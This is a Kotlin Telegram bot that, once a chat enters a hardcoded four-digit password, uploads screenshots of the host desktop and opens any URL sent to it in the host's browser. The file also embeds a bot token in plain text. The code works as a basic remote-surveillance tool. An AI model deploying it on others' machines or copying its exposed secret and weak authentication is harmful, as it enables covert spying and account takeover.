import org.telegram.telegrambots.bots.TelegramLongPollingBot
import org.telegram.telegrambots.meta.api.methods.send.SendDocument
import org.telegram.telegrambots.meta.api.methods.send.SendMessage
import org.telegram.telegrambots.meta.api.objects.InputFile
import org.telegram.telegrambots.meta.api.objects.Update
import org.telegram.telegrambots.meta.exceptions.TelegramApiException
import java.awt.*
import java.io.File
import java.net.URI
import javax.imageio.ImageIO

class Bot : TelegramLongPollingBot() {

    private val authorizedUsers = mutableMapOf<Long, Boolean>()
    private val password = "5238" // Secrete key

    override fun getBotUsername(): String {
        return "Bruh"
    }

    override fun getBotToken(): String {
        return "5774498751:AAEu-kkRAXG2dtExK0xxNJIrqA01r03moY0"
    }

    override fun onUpdateReceived(update: Update) {
        if (update.hasMessage() && update.message.hasText()) {
            val messageText = update.message.text
            val chatId = update.message.chatId

            if (authorizedUsers[chatId] == true) {
                handleAuthorizedCommands(chatId, messageText, update)
            } else {
                handleAuthorization(chatId, messageText)
            }
        }
    }

    private fun handleAuthorization(chatId: Long, messageText: String) {
        if (messageText == password) {
            authorizedUsers[chatId] = true
            sendMessage(chatId, "Вы успешно авторизованы! Теперь вы можете использовать команды.")
        } else {
            sendMessage(chatId, "Введите пароль для авторизации:")
        }
    }

    private fun handleAuthorizedCommands(chatId: Long, messageText: String, update: Update) {
        if (messageText == "/screen") {
            val screenshotFile = takeScreenshot()

            if (screenshotFile != null) {
                val sendDocumentRequest = SendDocument()
                sendDocumentRequest.chatId = chatId.toString()
                sendDocumentRequest.document = InputFile(screenshotFile)

                try {
                    execute(sendDocumentRequest)
                } catch (e: TelegramApiException) {
                    e.printStackTrace()
                }
            } else {
                sendMessage(chatId, "Не удалось сделать скриншот.")
            }
        } else if (messageText.startsWith("/web ")) {
            val url = messageText.substring(5).trim()
            webPage(url, chatId)
        }
    }


    private fun webPage(url: String, chatId: Long) {
        try {
            if (Desktop.isDesktopSupported()) {
                val desktop = Desktop.getDesktop()
                desktop.browse(URI(url))
                sendMessage(chatId, "Открываю браузер с URL: $url")
            } else {
                sendMessage(chatId, "Операция не поддерживается на этой системе.")
            }
        } catch (e: Exception) {
            e.printStackTrace()
            sendMessage(chatId, "Не удалось открыть браузер с URL: $url. Убедитесь, что ссылка правильная.")
        }
    }

    private fun sendMessage(chatId: Long, text: String) {
        val message = SendMessage()
        message.chatId = chatId.toString()
        message.text = text
        try {
            execute(message)
        } catch (e: TelegramApiException) {
            e.printStackTrace()
        }
    }

    private fun takeScreenshot(): File? {
        return try {
            val screenSize: Dimension = Toolkit.getDefaultToolkit().screenSize
            val screenRectangle = Rectangle(screenSize)
            val robot = Robot()
            val image = robot.createScreenCapture(screenRectangle)

            val screenshotFile = File("screenshot.png")
            ImageIO.write(image, "png", screenshotFile)
            screenshotFile
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }
}

